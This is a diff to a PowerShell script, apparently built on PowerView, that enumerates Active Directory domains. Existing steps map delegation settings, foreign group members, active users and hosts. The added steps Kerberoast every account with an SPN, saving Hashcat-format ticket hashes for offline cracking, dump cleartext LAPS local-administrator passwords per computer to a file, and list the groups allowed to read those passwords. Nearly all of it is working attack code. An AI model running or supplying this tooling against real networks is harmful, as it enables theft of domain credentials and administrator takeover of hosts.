@@ -11,6 +11,9 @@
       * <domain>_constrained.txt
       * <domain>_rbcd.txt
       * <domain>_ForeignGroupMember.txt
+      * <domain>_kerberos_hashes.txt
+      * <domain>_laps_hosts.txt
+      * <domain>_laps_group.txt
     - Aggregates:
       * potential_users.txt (with Groups column)
       * etc_hosts.txt (aligned, no headers)
@@ -106,7 +109,7 @@ foreach ($d in $domains) {
     # ——————————————
     # Delegation Checks for this domain:
 
-    # 1) Unconstrained delegation → just output machine Name
+    # 1) Unconstrained delegation
     $uFile = "${d}_unconstrained.txt"
     Get-DomainComputer -Domain $d -Unconstrained |
       Select-Object -ExpandProperty Name |
@@ -115,7 +118,7 @@ foreach ($d in $domains) {
     Get-Content $uFile | ForEach-Object { Write-Host "    $_" }
     Write-Host ""
 
-    # 2) Constrained delegation → Name : allowed-to-delegate-to targets
+    # 2) Constrained delegation
     $cFile = "${d}_constrained.txt"
     Get-DomainUser -Domain $d -TrustedToAuth |
       ForEach-Object {
@@ -126,7 +129,7 @@ foreach ($d in $domains) {
     Get-Content $cFile | ForEach-Object { Write-Host "    $_" }
     Write-Host ""
 
-    # 3) Resource-Based Constrained Delegation (RBCD)
+    # 3) RBCD delegations
     $rFile = "${d}_rbcd.txt"
     Get-DomainComputer -Domain $d |
       Get-ObjectAcl -ResolveGUIDs |
@@ -142,7 +145,7 @@ foreach ($d in $domains) {
     Get-Content $rFile | ForEach-Object { Write-Host "    $_" }
     Write-Host ""
 
-    # 4) Identifying Foreign Group Membership
+    # 4) Foreign group membership
     $fgFile = "${d}_ForeignGroupMember.txt"
     Get-DomainForeignGroupMember -Domain $d |
       ForEach-Object { Convert-SidToName $_.MemberName } |
@@ -150,11 +153,57 @@ foreach ($d in $domains) {
     Write-Host "  Foreign group members: $fgFile" -ForegroundColor Yellow
     Get-Content $fgFile | ForEach-Object { Write-Host "    $_" }
     Write-Host ""
+
+    # 5) Kerberos hashes
+    $kFile = "${d}_kerberos_hashes.txt"
+    Get-DomainUser * -SPN -Domain $d |
+      Get-DomainSPNTicket -Format Hashcat |
+      ForEach-Object {
+          "{0}`n{1}`n" -f $_.SamAccountName, $_.Hash
+      } |
+      Out-File $kFile -Encoding utf8
+    Write-Host "  Kerberos hashes: $kFile" -ForegroundColor Yellow
+    Get-Content $kFile | ForEach-Object {
+        if ($_ -eq '') { Write-Host "" }
+        else { Write-Host "    $_" }
+    }
+    Write-Host ""
+
+    # 6) LAPS-configured computers
+    $lapsFile = "${d}_laps_hosts.txt"
+    Get-DomainComputer -Domain $d -LDAPFilter '(ms-Mcs-AdmPwdExpirationtime=*)' |
+      ForEach-Object {
+          "$($_.Name): $($_.'ms-mcs-admpwd')"
+      } |
+      Out-File $lapsFile -Encoding utf8
+    Write-Host "  LAPS hosts: $lapsFile" -ForegroundColor Yellow
+    Get-Content $lapsFile | ForEach-Object { Write-Host "    $_" }
+    Write-Host ""
+
+    # 7) LAPS reader groups (only IdentityName)
+    $lapsGroupFile = "${d}_laps_group.txt"
+    Get-DomainOU -Domain $d |
+      Get-DomainObjectAcl -ResolveGUIDs |
+      Where-Object {
+          ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and
+          ($_.ActiveDirectoryRights -match 'ReadProperty')
+      } |
+      ForEach-Object {
+          Convert-SidToName $_.SecurityIdentifier.Value
+      } |
+      Sort-Object -Unique |
+      Out-File $lapsGroupFile -Encoding utf8
+    Write-Host "  LAPS reader groups: $lapsGroupFile" -ForegroundColor Yellow
+    Get-Content $lapsGroupFile | ForEach-Object { Write-Host "    $_" }
+    Write-Host ""
     # ——————————————
 
     # Accumulate potential active users with Groups
     $activeUsers = $users |
-                   Where-Object { $_.LastLogon -is [DateTime] -and $_.LastLogon.Year -gt 1900 }
+                   Where-Object {
+                       $_.LastLogon -is [DateTime] -and
+                       $_.LastLogon.Year -gt 1900
+                   }
     if ($activeUsers) {
         foreach ($u in $activeUsers) {
             try {
@@ -174,7 +223,7 @@ foreach ($d in $domains) {
     }
 }
 
-# Write aligned potential users table (with Groups)
+# Write potential users
 $PotentialList |
   Format-Table Domain, User, LastLogon, Groups -AutoSize |
   Out-String -Width 200 |
@@ -182,7 +231,7 @@ $PotentialList |
 Write-Host "`nPotential Users file: potential_users.txt" -ForegroundColor Yellow
 Get-Content 'potential_users.txt' | ForEach-Object { Write-Host "  $_" }
 
-# Write aligned hosts entries table (no headers)
+# Write hosts entries
 $HostList |
   Format-Table IP, Hostname, Alias -AutoSize -HideTableHeaders |
   Out-String -Width 120 |
